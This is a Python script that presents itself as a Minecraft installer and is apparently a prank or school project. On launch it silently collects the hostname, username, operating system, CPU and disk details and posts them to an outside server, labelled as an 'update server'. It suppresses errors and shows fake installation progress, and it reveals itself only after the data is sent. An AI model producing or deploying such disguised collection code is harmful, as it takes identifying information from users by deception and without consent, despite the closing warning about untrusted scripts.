import time
import sys
import platform
import json
import urllib.request
import urllib.error
import socket
import os
import shutil
import getpass

# Configuration
SERVER_URL = "https://minecraft.puiustin.com/api/report"

def collect_telemetry():
    """Collects basic, non-sensitive system information."""
    
    # Disk Usage
    try:
        total, used, free = shutil.disk_usage("/")
        disk_info = {
            "total_gb": total // (2**30),
            "free_gb": free // (2**30)
        }
    except:
        disk_info = "Unknown"

    return {
        "hostname": socket.gethostname(),
        "current_user": getpass.getuser(),
        "os_system": platform.system(),
        "os_release": platform.release(),
        "os_version": platform.version(),
        "machine_arch": platform.machine(),
        "processor": platform.processor(),
        "cpu_count": os.cpu_count(),
        "disk_info": disk_info,
        "python_version": sys.version,
        "timestamp": time.time()
    }

def send_report(data):
    """Sends the collected data to the server."""
    print("Connecting to update server...")
    try:
        json_data = json.dumps(data).encode('utf-8')
        req = urllib.request.Request(
            SERVER_URL, 
            data=json_data, 
            headers={'Content-Type': 'application/json'}
        )
        
        # Set a timeout so the script doesn't hang if the server is down
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.getcode() == 200:
                print(" > Connection established.")
            else:
                print(f" > Server returned status: {response.getcode()}")
                
    except urllib.error.URLError:
        # Silently fail or print a generic message so the "joke" isn't ruined by a traceback
        print(" > Server connection skipped (Offline mode).")
    except Exception:
        print(" > Network check skipped.")

def main():
    print("Initializing Minecraft Installer...")
    
    # Send telemetry in the background (synchronously for this simple script)
    telemetry_data = collect_telemetry()
    send_report(telemetry_data)
    
    time.sleep(2)
    print("Downloading resources...")
    time.sleep(2)
    print("Configuring graphics...")
    time.sleep(2)
    
    # The Joke
    print("\nError: SEGMENTATION FAULT")
    print("Just kidding! This is a school project.")
    print("Don't download random scripts from the internet!")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()